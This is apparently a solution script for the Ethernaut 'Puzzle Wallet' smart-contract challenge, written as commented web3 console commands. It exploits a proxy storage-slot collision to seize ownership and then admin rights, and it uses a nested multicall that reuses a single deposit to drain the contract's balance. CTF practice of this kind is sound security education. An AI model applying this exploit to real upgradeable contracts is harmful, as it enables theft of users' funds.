//1. We can call proposeNewAdmin, which will essentially let us set the owner
    // This is because the owner slot in the implementation and the pendingAdmin slot are the same
//2. since we are now the owner, we can add ourselves to the whitelist and access any protected methods in the PuzzleWallet
//3. Drain the wallet of funds somehow

//4. We can call the setMaxbalance which will let us become the admin
    // This is because the storage slot for maxBalance in the PuzzleWallet and for admin in the Proxy are the same slot.


//check slot 0
await web3.eth.getStorageAt(contract.address, 0)


//get the function signature  of the proposeNewAdmin method
functionSignature = {
    name: 'proposeNewAdmin',
    type: 'function',
    inputs: [
        {
            type: 'address',
            name: '_newAdmin'
        }
    ]
}
let msgData = web3.eth.abi.encodeFunctionCall(functionSignature, [player])

//set the new owner/propse new admin
await sendTransaction({
    from: player,
    to: contract.address,
    data: msgData
  });


//check slot 0 (verify data changed)
await web3.eth.getStorageAt(contract.address, 0)

//addToWhitelist
await contract.addToWhitelist(player)




//use multi call to drain funds 
var puzzleDeposit= (await contract.deposit.request()).data
var multiCall = (await contract.multicall.request([ puzzleDeposit ])).data
var puzzleExecute = (await contract.execute.request(player, web3.utils.toWei('0.002', 'ether'), [])).data

await contract.multicall([puzzleDeposit, multiCall, puzzleExecute], 
    { from: player, value: web3.utils.toWei('0.001', 'ether')});

//confirm balance of contract is now 0
await getBalance(contract.address);


//first pad the address so we can convert to an integer
let paddedPlayer = "0x000000000000000000000000"+player.substr(2)

//storage slot at 1 
await web3.eth.getStorageAt(contract.address, 1)

//set max balance (which will also set us as admin)
await contract.setMaxBalance( web3.utils.toBN(paddedPlayer))
